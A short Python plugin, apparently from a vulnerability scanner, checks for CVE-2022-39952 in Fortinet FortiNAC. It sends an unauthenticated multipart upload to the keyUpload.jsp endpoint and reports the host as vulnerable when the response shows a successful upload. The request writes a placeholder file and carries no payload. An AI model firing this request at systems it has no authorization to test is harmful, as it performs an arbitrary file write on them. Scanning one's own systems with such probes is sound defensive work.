#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Fortinet FortiNAC 任意文件写入 CVE-2022-39952',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  rboundary = randomLowercase(8)
  ret = msg()
  headers = {
      'User-Agent': ua,
       'Content-Type': f'multipart/form-data; boundary=----WebKitFormBoundary{rboundary}'
      }
  target = '/configWizard/keyUpload.jsp'
  data =  f"\
        ------WebKitFormBoundary{rboundary}\r\n\
        Content-Disposition: form-data; name=\"key\"; filename=\"key\"\r\n\
        \r\n\
        xxx\r\n\
        ------WebKitFormBoundary{rboundary}--\r\n\
        "
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if "yams.jsp.portal.SuccessfulUpload" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret